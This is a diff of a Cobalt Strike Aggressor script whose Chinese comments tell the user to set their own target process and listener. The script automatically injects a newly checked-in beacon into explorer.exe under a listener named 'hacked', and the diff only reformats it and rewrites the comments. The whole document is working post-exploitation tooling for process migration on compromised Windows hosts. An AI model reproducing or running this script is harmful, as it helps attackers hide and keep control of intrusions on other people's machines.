@@ -1,54 +1,23 @@
+on beacon_initial{
+	sub callback{
 
-on beacon_initial
-
-{
-
-sub callback
-
-{
-
-$migrate = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';  #要迁移的进程名
-
-$listener = "hacked";  #要注入的监听名，修改成你自己的
-
-if ($2 ismatch $migrate)
-
-{
-
-$pid = matched()[1];
-
-$inject_pid = $pid;
-
-if (-is64 $1)
-
-{
-
-$arch = "x64";
-
-}
-
-else
-
-{
-
-$arch = "x86";
-
-}
-
-binject($1, $pid, $listener, $arch);
-
-}
-
-}
-
-if($inject_pid != beacon_info($1,"pid"))
-
-{
-
-bps($1, &callback);
-
-}
-
+		$migrate = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+'; #这里更改注入的程序名称
+		$listener = "hacked"; #这里更改注入的监听名称
+		if ($2 ismatch $migrate){
+			$pid = matched()[1];
+			$inject_pid = $pid;
+			if (-is64 $1){
+			$arch = "x64";  #程序在判断操作系统位数
+			}
+			else{
+				$arch = "x86";
+			}
+		binject($1, $pid, $listener, $arch);  
+		}
+	}
+if($inject_pid != beacon_info($1,"pid")){
+	bps($1, &callback);
+	}
 }
 
 println("cna程序导入正常");
